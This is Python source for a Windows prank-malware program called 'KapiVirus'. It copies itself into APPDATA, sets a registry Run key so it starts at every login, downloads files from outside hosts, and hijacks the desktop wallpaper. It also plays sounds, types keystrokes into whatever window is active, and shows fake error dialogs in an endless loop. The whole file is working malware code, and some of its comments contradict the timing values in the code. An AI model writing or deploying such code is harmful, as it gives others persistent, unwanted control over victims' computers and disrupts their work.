import os
import sys
import shutil
import winreg
import time
import ctypes
import pyautogui
import urllib.request
import winsound
import threading

FILENAME = "KapiVirus.exe"
APP_NAME = "KapiService"
IMG_URL = "https://img.itch.zone/aW1hZ2UvMTA2MTI2Ni82MDc1NDc0LnBuZw==/original/nIID%2Bn.png"
NYAW_URL = "https://github.com/andyyepes2009-wq/kapinyaw/raw/refs/heads/main/Nyaw-Original-_-FNF-Kapi-Nyaw-Sound-Effect-DJ-D322MW.wav"

def set_persistence():
    try:
        app_path = os.path.realpath(sys.executable)
        target_path = os.path.join(os.getenv('APPDATA'), FILENAME)
        if not os.path.exists(target_path):
            shutil.copy2(app_path, target_path)
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.SetValueEx(reg_key, APP_NAME, 0, winreg.REG_SZ, target_path)
    except:
        pass

def hijack_wallpaper():
    path = os.path.join(os.getenv('TEMP'), "kapi_bg.png")
    try:
        if not os.path.exists(path):
            urllib.request.urlretrieve(IMG_URL, path)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
    except:
        pass

def play_kapi_nyaw():
    path = os.path.join(os.getenv('TEMP'), "kapi_nyaw.wav")
    try:
        if not os.path.exists(path):
            urllib.request.urlretrieve(NYAW_URL, path)
        # SND_NODEFAULT prevents the sound from failing if the file is busy
        winsound.PlaySound(path, winsound.SND_FILENAME | winsound.SND_ASYNC | winsound.SND_NODEFAULT)
    except:
        pass

def ghost_type():
    try:
        # Failsafe: Ensures pyautogui has a tiny gap to breathe
        pyautogui.PAUSE = 0.1 
        pyautogui.press('enter')
        time.sleep(0.5)
        pyautogui.write('Nyaw :3', interval=0.1)
        time.sleep(0.5)
        pyautogui.press('enter')
    except:
        pass

def error_spammer():
    while True:
        try:
            # Runs in its own world, won't stop the sound/typing
            ctypes.windll.user32.MessageBoxW(0, "Nyaw :3", "System Error", 0x10 | 0x40000)
        except:
            pass
        time.sleep(5) # Increased to 15s to prevent system lag

def main():
    set_persistence()
    threading.Thread(target=error_spammer, daemon=True).start()
    
    while True:
        try:
            # Sound first
            play_kapi_nyaw()
            time.sleep(1)
            
            # Wallpaper
            hijack_wallpaper()
            
            # Typing (Try-Excepted individually so it can't kill the loop)
            try:
                ghost_type()
            except:
                pass
                
        except Exception:
            pass
        
        # Reduced to 60 seconds for testing - change back to 300 for 5 mins
        time.sleep(5) 

if __name__ == "__main__":
    mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "KapiVirus_Mutex_v2")
    if ctypes.windll.kernel32.GetLastError() != 183:
        main()